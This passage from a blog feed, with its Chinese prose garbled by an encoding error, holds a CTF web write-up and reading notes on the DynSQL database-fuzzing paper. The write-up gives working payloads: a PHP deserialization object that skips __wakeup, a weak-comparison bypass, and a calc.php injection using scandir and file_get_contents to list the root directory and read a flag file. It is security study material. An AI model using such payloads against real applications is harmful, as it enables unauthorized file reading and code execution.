)æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨_wakeupæ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚</li></ul><p>é‚£ä¹ˆè¿™é¢˜çš„æ„å›¾å°±æ¯”è¾ƒæ¸…æ™°äº†ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ„é€ username&#x3D;adminï¼Œpassword&#x3D;100ï¼Œç„¶åæ‰§è¡Œdestructæ—¶ï¼Œå°±ä¼šå¾—åˆ°flagï¼Œä½†å­˜åœ¨ä¸€ä¸ªwakeupï¼Œä¼šå§usernameä¿®æ”¹ä¸ºguestï¼Œç°åœ¨é¦–å…ˆéœ€è¦æ„é€ ä¸€ä¸ªusername&#x3D;admin,password&#x3D;100çš„åºåˆ—åŒ–å¯¹è±¡å»ç»™å®ƒååºåˆ—ï¼Œç„¶åéœ€è¦ç»•è¿‡wakeupï¼Œæ‰§è¡Œdestruct</p><p>æ„é€ ååºåˆ—åŒ–ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Name</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-number">100</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Nameusername&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;i:<span class="hljs-number">100</span>;&#125;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å¾—åˆ°payloadï¼š</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?<span class="hljs-keyword">select</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Nameusername&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;i:<span class="hljs-number">100</span>;&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå½“å‰å±æ€§ä¸ªæ•°å¤§äºå®é™…å±æ€§ä¸ªæ•°æ—¶ï¼Œå°±ä¼šè·³è¿‡__wakeup()ï¼Œå»æ‰§è¡Œ__destruct</p><p>ä¿®æ”¹payloadï¼š</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?<span class="hljs-keyword">select</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Nameusername&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;i:<span class="hljs-number">100</span>;&#125;<br></code></pre></td></tr></table></figure><p>ç”±äºä¸¤ä¸ªéƒ½æ˜¯ç§æœ‰å˜é‡ï¼Œç»§ç»­ä¿®æ”¹payload</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?<span class="hljs-keyword">select</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00password&quot;</span>;i:<span class="hljs-number">100</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/02/01/WebWriteUp3/image-20240201174111628.png" alt="image-20240201174111628"></p><p>å¾—åˆ°flag</p><h3 id="BackupFile"><a href="#BackupFile" class="headerlink" title="BackupFile"></a>BackupFile</h3><p>æç¤ºä¸ºå¤‡ä»½æ–‡ä»¶ï¼Œå¸¸ç”¨çš„åç¼€æœ‰.git .svn .swp .~ .bak .bash_history</p><p>æ‰€ä»¥ä¸€ä¸ªä¸ªå°è¯•ï¼Œæœ¬é¢˜æ˜¯index.php.bak</p><p>ä¸‹è½½ä¸‹æ¥ï¼Œå…¶å†…å®¹ä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$key</span>)) &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Just num!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$key</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span> == <span class="hljs-variable">$str</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try to find out source file!&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>phpçš„å¼±ç±»å‹æ¯”è¾ƒï¼Œå¦‚æœæ¯”è¾ƒä¸€ä¸ªæ•°å­—å’Œå­—ç¬¦ä¸²æˆ–è€…æ¯”è¾ƒæ¶‰åŠåˆ°æ•°å­—å†…å®¹çš„å­—ç¬¦ä¸²ï¼Œåˆ™å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆæ•°å€¼å¹¶ä¸”æ¯”è¾ƒæŒ‰ç…§æ•°å€¼æ¥è¿›è¡Œ</p><p>æ‰€ä»¥è¿™é‡Œåªéœ€è¦æ„é€ payloadï¼š?key&#x3D;123å³å¯</p><h3 id="EaseCalc"><a href="#EaseCalc" class="headerlink" title="EaseCalc"></a>EaseCalc</h3><p><img src="/2024/02/01/WebWriteUp3/image-20240203205319202.png" alt="image-20240203205319202"></p><p>ç®€å•å°è¯•ï¼Œæ•°å­—å¯ä»¥æ­£å¸¸æ˜¾ç¤ºï¼Œå­—æ¯ä¼šæŠ¥é”™</p><p>æŸ¥çœ‹æºç ï¼š</p><p><img src="/2024/02/01/WebWriteUp3/image-20240203210016882.png" alt="image-20240203210016882"></p><p>å¤§è‡´å°±æ˜¯é€šè¿‡ajaxï¼Œå‘æœåŠ¡å™¨å‘é€è¡¨å•ï¼Œæ ¹æ®æœåŠ¡å™¨è¿”å›çš„ç»“æœï¼Œä¸åˆ·æ–°ç½‘é¡µï¼Œæ›´æ–°é¡µé¢ä¸Šçš„å…ƒç´ </p><p>çœ‹ç€æœ‰ä¸ªcalc.phpï¼Œè®¿é—®ï¼Œå¾—åˆ°ä»¥ä¸‹ä»£ç </p><p><img src="/2024/02/01/WebWriteUp3/image-20240203205817503.png" alt="image-20240203205817503"></p><p>ä½¿ç”¨é»‘åå•è¿›è¡Œè¿‡æ»¤</p><p>é‚£ä¹ˆå°±éœ€è¦å¯¹ä¼ å‚numå’Œæˆ‘ä»¬å°è¯•è®¿é—®çš„æ–‡ä»¶ç›®å½•è¿›è¡Œè¿‡æ»¤</p><p>è¿™é‡Œå¯ä»¥åœ¨ä¼ å‚æ—¶ï¼Œåœ¨numå‰è¾¹åŠ ç©ºæ ¼ç»•è¿‡å­—ç¬¦æ£€æµ‹<strong>å› ä¸ºç°åœ¨çš„å˜é‡å«â€œ numâ€ï¼Œè€Œä¸æ˜¯â€œnumâ€ã€‚ä½†phpåœ¨è§£æçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠç©ºæ ¼ç»™å»æ‰ï¼Œè¿™æ ·æˆ‘ä»¬çš„ä»£ç è¿˜èƒ½æ­£å¸¸è¿è¡Œï¼Œè¿˜ä¸Šä¼ äº†éæ³•å­—ç¬¦ã€‚</strong>ï¼ˆè¿™ä¸ªåœ¨æˆ‘çœ‹æ¥ï¼Œæœ‰ç‚¹ç±»ä¼¼åç¼€åç»•è¿‡æ—¶å€™çš„xx.php.ï¼‰</p><p>é‚£ä¹ˆèƒ½ä¼ å‚ä¹‹åï¼Œçœ‹ç€è¿‡æ»¤äº†&#x2F;,é‚£ä¹ˆçŒœæµ‹è·Ÿæ–‡ä»¶è®¿é—®æœ‰å…³ï¼Œé‚£ä¹ˆå¦‚ä½•ç»•è¿‡å‘¢</p><p>åˆ©ç”¨<code>scandir</code> å‡½æ•°ï¼Œå…¶ç”¨äºè·å–æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•åˆ—è¡¨</p><p><code>scandir(chr(47))</code> è·å–çš„æ˜¯æ ¹ç›®å½• <code>/</code> ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•çš„åˆ—è¡¨ã€‚<code>chr</code> æ˜¯ä¸€ä¸ª PHP å‡½æ•°ï¼Œç”¨äºè¿”å›æŒ‡å®š ASCII å€¼çš„å­—ç¬¦ã€‚åœ¨è¿™é‡Œï¼Œ<code>chr(47)</code> è¿”å› ASCII å€¼ä¸º 47 çš„å­—ç¬¦ï¼Œå³æ–œæ  <code>/</code>ã€‚æ‰€ä»¥ï¼Œ<code>chr(47)</code> å°±æ˜¯è¡¨ç¤ºæ ¹ç›®å½• <code>/</code>ã€‚</p><p>æ„é€ payloadï¼Œ</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">/calc.php? num=<span class="hljs-number">1</span>; var<span class="hljs-constructor">_dump(<span class="hljs-params">scandir</span>(<span class="hljs-params">chr</span>(47)</span>));<br></code></pre></td></tr></table></figure><p><img src="/2024/02/01/WebWriteUp3/image-20240203213908903.png" alt="image-20240203213908903"></p><p>çœ‹åˆ°æ ¹ç›®å½•ä¸‹æœ‰ä¸ªæ–‡ä»¶å«f1agg</p><p>åˆ©ç”¨<code>file_get_contents</code> å‡½æ•°ï¼Œç”¨äºè·å–æ–‡ä»¶çš„å†…å®¹ã€‚</p><p>æ„é€ payloadï¼š</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">/calc.phpï¼Ÿ  %<span class="hljs-number">20</span>num=var_dump(file_get_contents(<span class="hljs-built_in">chr</span>(<span class="hljs-number">47</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">102</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">49</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>)))<br></code></pre></td></tr></table></figure><p><img src="/2024/02/01/WebWriteUp3/image-20240203214043914.png" alt="image-20240203214043914"></p><p>å¾—åˆ°flag</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DynSQL</title>
    <link href="/2024/01/30/DynSQL/"/>
    <url>/2024/01/30/DynSQL/</url>
    
    <content type="html"><![CDATA[<h2 id="DynSQL-Stateful-Fuzzing-for-Database-Management-Systems-with-Complex-and-Valid-SQL-Query-Generation"><a href="#DynSQL-Stateful-Fuzzing-for-Database-Management-Systems-with-Complex-and-Valid-SQL-Query-Generation" class="headerlink" title="DynSQL: Stateful Fuzzing for Database Management Systems with Complex and Valid SQL Query Generation"></a>DynSQL: Stateful Fuzzing for Database Management Systems with Complex and Valid SQL Query Generation</h2><p><strong>DynSQLï¼šç”¨äºå¤æ‚ä¸”æœ‰æ•ˆçš„SQLæŸ¥è¯¢ç”Ÿæˆçš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æœ‰çŠ¶æ€æ¨¡ç³Šæµ‹è¯•</strong></p><h3 id="çŸ¥è¯†ç‚¹ï¼š"><a href="#çŸ¥è¯†ç‚¹ï¼š" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h3><p>DBMSé€šå¸¸åœ¨å››ä¸ªé˜¶æ®µå¤„ç†æ¯ä¸ªè¯­å¥ï¼š<strong>è§£æã€ä¼˜åŒ–ã€è¯„ä¼°å’Œæ‰§è¡Œ</strong>ã€‚åœ¨è§£æé˜¶æ®µï¼ŒDBMSé¦–å…ˆæ ¹æ®å…¶é¢„å®šä¹‰çš„è¯­æ³•è§„åˆ™æ£€æŸ¥è¯­å¥çš„è¯­æ³•æ­£ç¡®æ€§ï¼Œç„¶åæ ¹æ®å½“å‰æ•°æ®åº“æ¨¡å¼æ£€æŸ¥è¯­ä¹‰æ­£ç¡®æ€§ã€‚å¦‚æœä»»ä½•è¯­æ³•æˆ–è¯­ä¹‰æ£€æŸ¥å¤±è´¥ï¼Œè¯¥è¯­å¥å°†è¢«ç›´æ¥ä¸¢å¼ƒï¼Œæ•´ä¸ªæŸ¥è¯¢å¤„ç†å¯èƒ½è¢«ç»ˆæ­¢ã€‚åœ¨åç»­é˜¶æ®µï¼ŒDBMSä¼˜åŒ–è¯­å¥çš„ä½çº§è¡¨è¾¾ï¼Œå¹¶ç”Ÿæˆè‹¥å¹²å¯èƒ½çš„æ‰§è¡Œè®¡åˆ’ã€‚ç„¶åï¼ŒDBMSè¯„ä¼°æ¯ä¸ªæ‰§è¡Œè®¡åˆ’çš„æˆæœ¬ï¼Œå¹¶æœ€ç»ˆæ‰§è¡Œæœ€æœ‰æ•ˆçš„è®¡åˆ’ã€‚è¯­å¥æ‰§è¡Œåï¼ŒDBMSæ›´æ–°çŠ¶æ€ï¼ŒåŒ…æ‹¬æ•°æ®åº“æ¨¡å¼å’Œæ‰§è¡ŒçŠ¶æ€ï¼Œç„¶åå¤„ç†æŸ¥è¯¢ä¸­çš„ä¸‹ä¸€ä¸ªè¯­å¥ã€‚</p><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>åº”ç”¨äºDBMSçš„æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯ï¼Œé€šè¿‡ç”Ÿæˆä¸€ç³»åˆ—SQLæŸ¥è¯¢æ¥æµ‹è¯•DBMSçš„å®‰å…¨æ€§ä¸€äº›æ¨¡ç³Šæµ‹è¯•å·¥å…·åˆ©ç”¨æ˜ç¡®å®šä¹‰çš„è§„åˆ™éšæœºç”ŸæˆSQLæŸ¥è¯¢ï¼Œå°†è¿™äº›æŸ¥è¯¢æä¾›ç»™ç›®æ ‡DBMSï¼Œå¹¶æ£€æŸ¥æ˜¯å¦è§¦å‘äº†ç¼ºé™·ã€‚è¿˜æœ‰ä¸€äº›æ–¹æ³•æ¶‰åŠåé¦ˆæœºåˆ¶ï¼šåœ¨æ¯ä¸ªæµ‹è¯•ç”¨ä¾‹æ‰§è¡Œä¹‹åï¼Œæ”¶é›†ç›®æ ‡DBMSçš„è¿è¡Œæ—¶ä¿¡æ¯ï¼ˆä¾‹å¦‚ä»£ç è¦†ç›–ç‡ï¼‰ï¼Œå¹¶æ£€æŸ¥æ˜¯å¦å‘ç”Ÿäº†æ”¹å˜æˆ–åˆ«çš„è¡Œä¸ºï¼ˆä¾‹å¦‚è¦†ç›–äº†æ–°çš„åˆ†æ”¯ï¼‰ã€‚å¦‚æœæ˜¯è¿™æ ·ï¼Œè¯¥æµ‹è¯•ç”¨ä¾‹å°†è¢«å­˜å‚¨ä¸ºä»¥åç”Ÿæˆæµ‹è¯•ç”¨ä¾‹çš„ç§å­ã€‚</p><h4 id="ç°çŠ¶"><a href="#ç°çŠ¶" class="headerlink" title="ç°çŠ¶"></a><strong>ç°çŠ¶</strong></h4><p>ç°æœ‰çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ¨¡ç³Šæµ‹è¯•å·¥å…·åœ¨ç”Ÿæˆå¤æ‚ä¸”æœ‰æ•ˆçš„æŸ¥è¯¢æ–¹é¢ä»ç„¶å­˜åœ¨é™åˆ¶ï¼Œéš¾ä»¥å‘ç°DBMSä¸­çš„æ·±å±‚æ¬¡ç¼ºé™·ã€‚</p><ul><li>å¤æ‚æŸ¥è¯¢ï¼šåŒ…å«å¤šä¸ªæ¶‰åŠSQLç‰¹æ€§çš„SQLè¯­å¥ï¼Œå¦‚å¤šå±‚åµŒå¥—å­æŸ¥è¯¢</li><li>æœ‰æ•ˆæŸ¥è¯¢ï¼šç¡®ä¿è¯­æ³•å’Œè¯­ä¹‰çš„æ­£ç¡®æ€§</li></ul><p>å¦‚SQLsmithåœ¨æ¯ä¸ªæŸ¥è¯¢ä¸­åªç”Ÿæˆä¸€ä¸ªè¯­å¥ï¼Œé¿å…åˆ†æè¯­å¥ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œç‰ºç‰²äº†å¤æ‚æ€§ä»¥æ¢å–æœ‰æ•ˆæ€§ï¼›SQUIRREL ä½¿ç”¨ä¸­é—´è¡¨ç¤ºï¼ˆIRï¼‰æ¨¡å‹æ¨æ–­ä¾èµ–å…³ç³»å¹¶ç”ŸæˆåŒ…å«å¤šä¸ªè¯­å¥çš„æŸ¥è¯¢ï¼Œä½†äº§ç”Ÿäº†è¶…è¿‡50ï¼…çš„æ— æ•ˆæŸ¥è¯¢ï¼Œå¹¶å€¾å‘äºç”Ÿæˆç®€å•çš„è¯­å¥</p><h4 id="æˆå› "><a href="#æˆå› " class="headerlink" title="æˆå› "></a><strong>æˆå› </strong></h4><p>ç°æœ‰å·¥å…·ä¸¥é‡ä¾èµ–å®šä¹‰çš„è¯­æ³•æ¨¡å‹å’Œå›ºå®šçš„å…ˆéªŒçŸ¥è¯†ï¼Œæœªå…³æ³¨å…¶è¿è¡Œæ—¶çŠ¶æ€ã€‚ä¾‹å¦‚SQLsmithå¿½è§†äº†çŠ¶æ€å˜åŒ–ï¼ŒSQUIRRELåˆ™æ˜¯é™æ€çš„æ¨æµ‹å…¶çŠ¶æ€ã€‚åœ¨æ²¡æœ‰å‡†ç¡®çš„çŠ¶æ€ä¿¡æ¯çš„æƒ…å†µä¸‹ï¼Œè¿™äº›æ¨¡ç³Šæµ‹è¯•å·¥å…·å€¾å‘äºåœ¨è¯­å¥ä¹‹é—´å»ºç«‹é”™è¯¯çš„ä¾èµ–å…³ç³»æˆ–æ»¥ç”¨SQLç‰¹æ€§ï¼Œå¯¼è‡´ç”Ÿæˆè®¸å¤šæ— æ•ˆæŸ¥è¯¢ã€‚ä¸ºäº†ç”Ÿæˆæœ‰æ•ˆçš„æµ‹è¯•ç”¨ä¾‹ï¼Œè¿™äº›æ¨¡ç³Šæµ‹è¯•å·¥å…·å¿…é¡»é™åˆ¶ç”ŸæˆæŸ¥è¯¢çš„å¤æ‚æ€§ï¼Œé€šè¿‡ç”Ÿæˆç®€å•è¯­å¥æ¥é¿å…è¿™ç§çŠ¶å†µã€‚</p><h4 id="ä¸ºä»€ä¹ˆç”Ÿæˆå¤æ‚ä¸”æœ‰æ•ˆçš„æŸ¥è¯¢æ˜¯å…·æœ‰æŒ‘æˆ˜æ€§çš„"><a href="#ä¸ºä»€ä¹ˆç”Ÿæˆå¤æ‚ä¸”æœ‰æ•ˆçš„æŸ¥è¯¢æ˜¯å…·æœ‰æŒ‘æˆ˜æ€§çš„" class="headerlink" title="ä¸ºä»€ä¹ˆç”Ÿæˆå¤æ‚ä¸”æœ‰æ•ˆçš„æŸ¥è¯¢æ˜¯å…·æœ‰æŒ‘æˆ˜æ€§çš„"></a><strong>ä¸ºä»€ä¹ˆç”Ÿæˆå¤æ‚ä¸”æœ‰æ•ˆçš„æŸ¥è¯¢æ˜¯å…·æœ‰æŒ‘æˆ˜æ€§çš„</strong></h4><p><img src="/2024/01/30/DynSQL/image-20240131204350172.png" alt="image-20240131204350172"></p><p><strong>åˆ›å»ºè¡¨t1ï¼š</strong> åˆ›å»ºäº†ä¸€ä¸ªåä¸ºt1çš„è¡¨ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªåä¸ºf1çš„æ•´æ•°å­—æ®µã€‚</p><p><strong>åˆ›å»ºè§†å›¾v1ï¼š</strong> åˆ›å»ºäº†ä¸€ä¸ªåä¸ºv1çš„è§†å›¾ï¼Œè¯¥è§†å›¾çš„å®šä¹‰æ¶‰åŠä¸‰çº§åµŒå¥—çš„å­SELECTè¯­å¥ã€‚è¿™ä¸ªè§†å›¾åŒ…å«ä¸¤ä¸ªåˆ—c2å’Œc4ï¼Œå…¶ä¸­c2å’Œc4çš„å€¼éƒ½æ¥è‡ªå­æŸ¥è¯¢ä¸­çš„c4ã€‚</p><p><strong>WITHå­å¥ï¼ˆå…¬å…±è¡¨è¾¾å¼ï¼‰ï¼š</strong> ä½¿ç”¨WITHå­å¥åˆ›å»ºäº†ä¸€ä¸ªåä¸ºcte_0çš„å…¬å…±è¡¨è¾¾å¼ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªSELECTè¯­å¥ã€‚è¿™ä¸ªSELECTè¯­å¥ä½¿ç”¨ä¸¤ä¸ªå­æŸ¥è¯¢ï¼ˆsubq_0å’Œsubq_1ï¼‰å’Œä¸€ä¸ªäº¤å‰è¿æ¥ï¼ˆCROSS JOINï¼‰æ¥ç”Ÿæˆç»“æœã€‚</p><ul><li>å­æŸ¥è¯¢subq_0é€‰æ‹©äº†è§†å›¾v1ä¸­çš„åˆ—c4ï¼Œå¹¶å°†å…¶é‡å‘½åä¸ºc6ã€‚</li><li>å­æŸ¥è¯¢subq_1é€‰æ‹©äº†å¸¸é‡å€¼11ï¼Œå¹¶å°†å…¶é‡å‘½åä¸ºc4ã€‚</li><li>äº¤å‰è¿æ¥å°†è¿™ä¸¤ä¸ªå­æŸ¥è¯¢çš„ç»“æœç»„åˆåœ¨ä¸€èµ·ã€‚</li></ul><p><strong>æœ€ç»ˆæŸ¥è¯¢ï¼š</strong> æ‰§è¡Œä¸€ä¸ªç®€å•çš„SELECTè¯­å¥ï¼Œé€‰æ‹©å¸¸é‡å€¼1ã€‚è¿™ä¸ªæŸ¥è¯¢æœ¬èº«æ²¡æœ‰å®é™…çš„ç›®çš„ï¼Œä¸»è¦æ˜¯ä½œä¸ºä¸€ä¸ªæœ€å°çš„æµ‹è¯•ç”¨ä¾‹ï¼Œç”¨äºè§¦å‘æœåŠ¡å™¨æ¼æ´ã€‚</p><p>è¿™æ˜¯ä¸€ä¸ªæ¶æ„æŸ¥è¯¢ï¼Œå¯ä»¥ä½¿MariaDBæœåŠ¡å™¨å´©æºƒå¹¶å®ç°æ‹’ç»æœåŠ¡æ”»å‡»ï¼Œåœ¨DynSQLå‘ç°ä¹‹å‰å­˜åœ¨äº†è¶…è¿‡5å¹´ï¼Œè€Œæ˜¾ç„¶ï¼Œå¯¹äºä¼ ç»Ÿçš„æ¨¡ç³Šæµ‹è¯•å™¨æ¥è¯´ï¼Œç”Ÿæˆè¿™æ ·çš„æŸ¥è¯¢è¯­å¥ä»¥æ£€æµ‹æ¼æ´æ˜¯éå¸¸éš¾çš„</p><h4 id="æœ¬æ–‡è§£å†³æ–¹æ¡ˆ"><a href="#æœ¬æ–‡è§£å†³æ–¹æ¡ˆ" class="headerlink" title="æœ¬æ–‡è§£å†³æ–¹æ¡ˆ"></a><strong>æœ¬æ–‡è§£å†³æ–¹æ¡ˆ</strong></h4><p>DBMSé€æ¡å¤„ç†æ¯ä¸ªæŸ¥è¯¢è¯­å¥ï¼Œå¹¶åœ¨æ‰§è¡Œæ¯ä¸ªè¯­å¥åæ›´æ”¹å—æ“çºµæ•°æ®åº“çš„çŠ¶æ€ã€‚åœ¨è¯­å¥å¤„ç†çš„é—´éš”ä¸­ï¼ŒDBMSç‰¹å®šçš„çŠ¶æ€ä¿¡æ¯ï¼ŒåŒ…æ‹¬æœ€æ–°çš„æ•°æ®åº“æ¨¡å¼å’Œè¯­å¥å¤„ç†çŠ¶æ€ï¼Œæ˜¯å¯ç”¨çš„ã€‚</p><p>åˆ©ç”¨è¿™ä¸ªä¿¡æ¯ï¼Œæœ¬æ–‡æå‡ºäº†æœ‰çŠ¶æ€çš„DBMSæ¨¡ç³Šæµ‹è¯•æ¡†æ¶ï¼Œé€šè¿‡<strong>æ‰§è¡ŒåŠ¨æ€æŸ¥è¯¢äº¤äº’å°†æŸ¥è¯¢ç”Ÿæˆå’ŒæŸ¥è¯¢æ‰§è¡Œåˆå¹¶</strong>ï¼Œè€Œä¸æ˜¯ä¼ ç»Ÿçš„åœ¨æŸ¥è¯¢æ‰§è¡Œä¹‹å‰å®ŒæˆæŸ¥è¯¢ç”Ÿæˆã€‚è¿™ç§æ–¹æ³•å°†æ¯ä¸ªç”Ÿæˆçš„è¯­å¥æä¾›ç»™ç›®æ ‡DBMSï¼Œç„¶ååœ¨è¯­å¥æ‰§è¡ŒååŠ¨æ€ä¸DBMSäº¤äº’ï¼Œæ”¶é›†æœ€æ–°çš„çŠ¶æ€ä¿¡æ¯ã€‚æ”¶é›†åˆ°çš„çŠ¶æ€ä¿¡æ¯ç”¨äºæŒ‡å¯¼åç»­è¯­å¥çš„ç”Ÿæˆã€‚ä¸ºäº†æå‡æœ‰æ•ˆæ€§ï¼Œæ”¶é›†å…³äºæŸ¥è¯¢æ‰§è¡Œçš„ä¿¡æ¯ï¼Œå¹¶è§‚å¯Ÿç”Ÿæˆçš„æŸ¥è¯¢æ˜¯å¦é€šè¿‡ç›®æ ‡DBMSçš„è¯­æ³•å’Œè¯­ä¹‰æ£€æŸ¥ã€‚å¦‚æœç”Ÿæˆçš„æŸ¥è¯¢è§¦å‘äº†ä»»ä½•è¯­æ³•æˆ–è¯­ä¹‰é”™è¯¯ï¼Œè¿™äº›æŸ¥è¯¢è¢«æ ‡è¯†ä¸ºæ— æ•ˆå¹¶è¢«ç›´æ¥ä¸¢å¼ƒã€‚è¿™æ ·èƒ½ä¿è¯æ‰€æœ‰çš„ç§å­éƒ½æ˜¯æœ‰æ•ˆçš„ã€‚</p><p>è¯»åˆ°æ­¤å¤„çš„ç–‘é—®ï¼š</p><ol><li>å¦‚ä½•é‡åŒ–DBMSçš„çŠ¶æ€ï¼Œä»€ä¹ˆæ ·æ‰æ˜¯å¼•èµ·äº†çŠ¶æ€å˜åŒ–</li><li>å¦‚ä½•æ ¹æ®çŠ¶æ€å˜åŒ–è‡ªä¸»çš„å»ç”Ÿæˆä¸€æ¡å¤æ‚çš„æŸ¥è¯¢ï¼ˆå¦‚ä¾‹å­æ‰€ç¤º</li></ol>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
